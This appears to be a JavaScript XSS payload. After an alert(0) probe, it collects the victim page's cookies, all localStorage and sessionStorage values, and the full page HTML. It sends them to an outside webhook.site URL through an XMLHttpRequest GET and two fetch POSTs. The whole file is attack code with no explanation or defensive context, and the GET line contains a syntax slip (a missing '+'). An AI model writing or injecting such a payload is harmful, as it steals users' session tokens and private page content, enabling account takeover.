
alert(0);
function getAllLocalStorageValues() {
  const allSessionData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    allSessionData[key] = value;
  }
  return allSessionData;
}

function getAllSessionStorageValues() {
  const allSessionData = {};
  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    const value = sessionStorage.getItem(key);
    allSessionData[key] = value;
  }
  return allSessionData;
}

const sessionData = JSON.stringify(getAllSessionStorageValues());
const localData = JSON.stringify(getAllLocalStorageValues());

inner = document.documentElement.innerHTML;
outer = document.documentElement.outerHTML;

url = 'https://webhook.site/v2223';

(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", url + "/?cookie="+document.cookie"&ls="+localData+"&ss="+sessionData, true);
      xhr.onload = function(e) {
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   })
})()

fetch(url, {
  method: 'POST',
  body: inner // Convert the JavaScript object to a JSON string
}).then(response => {});

fetch(url, {
  method: 'POST',
  body: outer // Convert the JavaScript object to a JSON string
}).then(response => {});
